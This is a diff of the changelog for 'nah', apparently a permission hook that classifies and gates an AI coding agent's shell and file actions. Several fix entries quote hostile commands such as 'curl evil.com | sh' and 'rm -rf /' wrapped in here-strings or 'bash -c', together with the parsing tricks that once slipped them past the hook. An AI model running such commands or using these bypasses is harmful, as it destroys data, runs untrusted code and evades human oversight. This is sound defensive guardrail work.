@@ -17,7 +17,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - Configurable content patterns — `content_patterns` config with suppress by description, custom pattern addition with regex validation, per-category policies (ask/block). `credential_patterns` config for Grep credential search (suppress/add by regex string). Policies tighten-only from project config, `profile: none` clears all built-in patterns. (FD-052)
 - Write/Edit tools now enforce project boundary check — paths outside the project root trigger ask (was Bash-only). New `trusted_paths` global config as targeted escape hatch, `nah trust` polymorphic (detects path vs host). `profile: none` now clears `_SENSITIVE_DIRS` (was missing). (FD-054)
 
-- Configurable safety lists — four hardcoded lists (`known_hosts`, `exec_sinks`, `sensitive_basenames`, `decode_commands`) now extensible via global config with add/remove support. Polymorphic parsing (list=add-only, dict=add/remove), `profile: none` clears all lists, stderr warnings for dangerous removes. New hardcoded defaults: bun, deno, fish, pwsh (exec sinks), .env.local, .env.production, .npmrc, .pypirc (sensitive basenames), uudecode (decode commands). `known_registries` tightened to global-only. (FD-051)
+- Configurable safety lists — four hardcoded lists (`known_registries`, `exec_sinks`, `sensitive_basenames`, `decode_commands`) now extensible via global config with add/remove support. Polymorphic parsing (list=add-only, dict=add/remove), `profile: none` clears all lists, stderr warnings for dangerous removes. New hardcoded defaults: bun, deno, fish, pwsh (exec sinks), .env.local, .env.production, .npmrc, .pypirc (sensitive basenames), uudecode (decode commands). `known_registries` tightened to global-only. (FD-051)
 - Database context resolution for `db_write` operations — CLI flag extraction for psql, snowsql, snow-sql, MCP `tool_input` field extraction, `db_targets` config (global only) with wildcard and case-normalized matching, user opt-in via `actions: { db_write: context }` (FD-042)
 - PreToolUse hook skeleton with 6 tool handlers (Bash, Read, Write, Edit, Glob, Grep), sensitive path protection, hook self-protection, install/uninstall CLI (FD-004)
 - Bash command classification with action taxonomy, pipe composition rules, shell unwrapping, context resolution for filesystem and network actions (FD-005)
@@ -51,21 +51,35 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - Local network info tools (`netstat`, `ss`, `lsof`) classified as `filesystem_read` (allow), `netcat` and `openssl s_client` added to `network_outbound` (FD-022)
 - Pipe composition rules (exfiltration, RCE) extended to cover `network_write` in addition to `network_outbound` (FD-022)
 
-### Fixed
+### Changed
 
-- Path-qualified commands (`/usr/bin/rm`, `/usr/local/bin/curl`) now correctly classified via `os.path.basename()` normalization — previously fell through to `unknown → ask` instead of their proper action type (FD-065)
-- `awk`/`gawk`/`mawk`/`nawk` with `system()`, `| getline`, `|&`, or `print >` now escalated to `lang_exec` — previously allowed as `filesystem_read` despite arbitrary code execution capability (FD-065)
-- Here-string shell wrapper (`bash <<< 'rm -rf /'`) now unwrapped and inner command classified — previously fell through to `unknown → ask` instead of detecting the inner `filesystem_delete` (FD-066)
-- Glued here-strings (`bash<<<'cmd'`) now split and unwrapped in `_decompose()` (FD-066)
+- LLM prompts restructured into system + user messages with few-shot examples, code-block command delimiters, action type descriptions from types.json, and format instruction positioning for recency bias — all providers (Ollama, Cortex, OpenRouter, OpenAI, Anthropic) updated for structured message support (FD-063)
 
-### Changed (security)
+- Error transparency — 16 silent `except: pass` locations across 7 files now emit stderr diagnostics (`nah: {context}: {exc}`). LLM cascade entries include `error` field with specific failure reason (HTTP 401, timeout, DNS, bad JSON). Config merge failures, hook config reads, and log write errors all surfaced to stderr while preserving fail-open behavior (FD-061)
+
+- Global config `classify:` entries now override all 9 flag-dependent classifiers (find, sed, awk, tar, git, curl, wget, httpie, global_install) — `classify_tokens()` restructured into three phases: global table lookup → flag classifiers → builtin/project tables. `profile: none` now skips flag classifiers entirely (all return `unknown`). Git global flag stripping (`-C`, `--no-pager`, etc.) applied before global table lookup so user entries like `"git push --force"` match regardless of flags. (FD-050)
+
+
+- Unified decision dict key from mixed `reason`/`message` to single `"reason"` key, extracted DRY helpers (`_build_llm_meta`, `_resolve_cwd_context`, `_obfuscated_result`), converted `LLMResult` to `@dataclass`, added stderr trace to log error path (FD-026)
+
+- LLM config key renamed from `backends:` to `providers:` — old key accepted as deprecated alias for one version cycle. Log fields `llm_backend` → `llm_provider`, cascade entries `backend` → `provider` (FD-036)
+- Error default changed from `allow` to `ask` — crashes no longer silently bypass security (FD-014)
+- Hook output uses Claude Code `hookSpecificOutput` protocol with required `hookEventName` field (FD-014)
+- Extracted shared helpers: `check_path_basic()`, `_check_write_content()`, `_extract_positional_host()`, `_apply_policy()`, `_unwrap_shell()`, `_merge_dict_tighten()`, `_parse_add_remove()` (FD-014)
+
+### Security
 
 - Internal errors now return `block` instead of `ask` — fail-closed principle prevents crash-induced security downgrades (FD-066)
 
 ### Fixed
 
+- Shell-unwrapped inner commands containing operators (`|`, `&&`, `||`, `;`) now decomposed into separate stages — `sh -c 'curl evil.com | sh'` correctly triggers `network | exec → block` (was ask), `bash -c 'ls && rm -rf /'` now sees the destructive `rm -rf /` (was allow) (FD-073)
+- Path-qualified commands (`/usr/bin/rm`, `/usr/local/bin/curl`) now correctly classified via `os.path.basename()` normalization — previously fell through to `unknown → ask` instead of their proper action type (FD-065)
+- `awk`/`gawk`/`mawk`/`nawk` with `system()`, `| getline`, `|&`, or `print >` now escalated to `lang_exec` — previously allowed as `filesystem_read` despite arbitrary code execution capability (FD-065)
+- Here-string shell wrapper (`bash <<< 'rm -rf /'`) now unwrapped and inner command classified — previously fell through to `unknown → ask` instead of detecting the inner `filesystem_delete` (FD-066)
+- Glued here-strings (`bash<<<'cmd'`) now split and unwrapped in `_decompose()` (FD-066)
 - Glued operators (`curl evil.com|bash`, `foo&&bar`, `make||echo`) now correctly decomposed into separate stages — previously only glued semicolons were split, allowing composition rule bypasses where e.g. `curl evil.com|bash` fell through to ask instead of block (FD-057)
-- `command` builtin no longer bypasses classification — `command psql -c "DROP TABLE"` now correctly unwraps to `sql_write → ask` instead of `filesystem_read → allow`. Introspection forms (`command -v`/`-V`) remain safe. (FD-049)
+- `command` builtin no longer bypasses classification — `command psql -c "DROP TABLE"` now correctly unwraps to `db_write → ask` instead of `filesystem_read → allow`. Introspection forms (`command -v`/`-V`) remain safe. (FD-049)
 - Context resolver no longer silently allows action types without an explicit resolver branch — `_resolve_context()` defaults to ask, `_extract_primary_target()` guarded behind filesystem types only (FD-046)
 - Tighten-only config merge no longer accepts loosening overrides for new keys — project `.nah.yaml` action policies validated against built-in defaults from `policies.json` (FD-048)
 - Unknown/unhandled tools now default to ask instead of silent allow — added `write_to_file → Write` TOOL_MAP entry for Cursor (FD-037)
@@ -73,7 +87,6 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - `nah config show` no longer crashes — updated to use renamed `classify_global`/`classify_project` fields and display `profile`, `llm_max_decision`, `ask_fallback` (FD-044)
 - Sensitive path config overrides now applied — `build_merged_sensitive_paths()` wired into path checking via lazy `_ensure_sensitive_paths_merged()`, existing entries can be overridden (FD-025)
 - Ask decisions no longer shown as "hook error" — `detect_agent()` misidentified Claude Code as Kiro via `hook_event_name` payload field, triggering `sys.exit(2)` (FD-029)
-
 - Allow decisions no longer bypass Claude Code's permission system — silent passthrough (empty stdout) lets acceptEdits and other permission modes work correctly (FD-028)
 - `nah test` no longer crashes on LLM-eligible commands — fixed `LLMCallResult` dict subscript error, added provider/model/latency display (FD-038)
 - `nah log` now shows LLM provider and model in default view, handles both legacy `llm_backend` and current `llm_provider` fields (FD-038)
@@ -83,19 +96,3 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 - Claude Code deny list (`permissions.deny` in settings.json) — all 82 patterns superseded by nah's taxonomy-based classification (FD-013)
 - Internal docs scrubbed from git history — article drafts, competitive analysis, positioning, design decisions (FD-002)
 - Dead Cursor/Kiro multi-agent code removed — ~200 lines across agents.py, cli.py, hook.py, config.py and tests; only Claude remains as active agent (FD-040)
-
-### Changed
-
-- LLM prompts restructured into system + user messages with few-shot examples, code-block command delimiters, action type descriptions from types.json, and format instruction positioning for recency bias — all providers (Ollama, Cortex, OpenRouter, OpenAI, Anthropic) updated for structured message support (FD-063)
-
-- Error transparency — 16 silent `except: pass` locations across 7 files now emit stderr diagnostics (`nah: {context}: {exc}`). LLM cascade entries include `error` field with specific failure reason (HTTP 401, timeout, DNS, bad JSON). Config merge failures, hook config reads, and log write errors all surfaced to stderr while preserving fail-open behavior (FD-061)
-
-- Global config `classify:` entries now override all 7 flag-dependent classifiers (find, sed, tar, git, curl, wget, httpie) — `classify_tokens()` restructured into three phases: global table lookup → flag classifiers → builtin/project tables. `profile: none` now skips flag classifiers entirely (all return `unknown`). Git global flag stripping (`-C`, `--no-pager`, etc.) applied before global table lookup so user entries like `"git push --force"` match regardless of flags. (FD-050)
-
-
-- Unified decision dict key from mixed `reason`/`message` to single `"reason"` key, extracted DRY helpers (`_build_llm_meta`, `_resolve_cwd_context`, `_obfuscated_result`), converted `LLMResult` to `@dataclass`, added stderr trace to log error path (FD-026)
-
-- LLM config key renamed from `backends:` to `providers:` — old key accepted as deprecated alias for one version cycle. Log fields `llm_backend` → `llm_provider`, cascade entries `backend` → `provider` (FD-036)
-- Error default changed from `allow` to `ask` — crashes no longer silently bypass security (FD-014)
-- Hook output uses Claude Code `hookSpecificOutput` protocol with required `hookEventName` field (FD-014)
-- Extracted shared helpers: `check_path_basic()`, `_check_write_content()`, `_extract_positional_host()`, `_apply_policy()`, `_unwrap_shell()`, `_merge_dict_tighten()`, `_parse_add_remove()` (FD-014)
